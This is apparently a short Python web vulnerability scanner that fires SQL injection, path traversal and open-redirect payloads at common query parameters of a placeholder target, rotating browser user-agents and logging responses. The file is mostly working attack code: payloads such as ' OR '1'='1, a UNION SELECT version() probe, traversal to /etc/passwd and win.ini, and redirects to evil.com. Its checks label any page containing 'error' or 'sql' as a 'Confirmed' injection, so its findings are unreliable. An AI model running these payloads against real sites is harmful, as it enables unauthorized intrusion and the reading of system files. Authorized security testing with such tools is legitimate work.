import requests
import re
from urllib.parse import urljoin
from datetime import datetime
import itertools

# Basic configurations
TARGET_URL = "https://site.com"  # Replace with the target URL (legally authorized)
COMMON_PARAMS = ["id", "q", "search", "page", "user", "name", "redirect", "next", "url", "view", "path", "ref", "action", "cmd", "execute"]  # Extended parameter list
BROWSERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
]

def log_finding(finding, response_text):
    timestamp = datetime.now().strftime("%Y-%m-%d")
    domain = TARGET_URL.replace("https://", "").replace("http://", "").replace("/", "")
    filename = f"{domain}_{timestamp}.log"
    with open(filename, "a") as log_file:
        log_file.write(finding + "\n")
        log_file.write("Response Snippet:\n")
        log_file.write(response_text[:500] + "\n\n")  # Log first 500 characters of response

def test_sqli(url):
    sqli_payloads = ["' OR '1'='1", "' UNION SELECT null, version() --", "' OR 'a'='a"]
    for param, payload, browser in itertools.product(COMMON_PARAMS, sqli_payloads, BROWSERS):
        headers = {"User-Agent": browser}
        params = {param: payload}
        response = requests.get(url, params=params, headers=headers)
        if "error" in response.text.lower() or "sql" in response.text.lower():
            finding = f"[+] Confirmed SQL Injection at: {url} with parameter {param} using {browser}"
            print(finding)
            log_finding(finding, response.text)

def test_lfi(url):
    lfi_payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
    for param, payload, browser in itertools.product(COMMON_PARAMS, lfi_payloads, BROWSERS):
        headers = {"User-Agent": browser}
        params = {param: payload}
        response = requests.get(url, params=params, headers=headers)
        if "root:x:" in response.text or "for 16-bit app support" in response.text:
            finding = f"[+] Confirmed Local File Inclusion (LFI) at: {url} with parameter {param} using {browser}"
            print(finding)
            log_finding(finding, response.text)

def test_open_redirect(url):
    redirect_payloads = ["http://evil.com", "//evil.com"]
    for param, payload, browser in itertools.product(COMMON_PARAMS, redirect_payloads, BROWSERS):
        headers = {"User-Agent": browser}
        params = {param: payload}
        response = requests.get(url, params=params, headers=headers, allow_redirects=True)
        if "evil.com" in response.url:
            finding = f"[+] Confirmed Open Redirect at: {url} with parameter {param} using {browser}"
            print(finding)
            log_finding(finding, response.text)

def run_scanner():
    print("[*] Starting Security Scanner...")
    test_sqli(TARGET_URL)
    test_lfi(TARGET_URL)
    test_open_redirect(TARGET_URL)
    print("[*] Scan complete.")

if __name__ == "__main__":
    run_scanner()
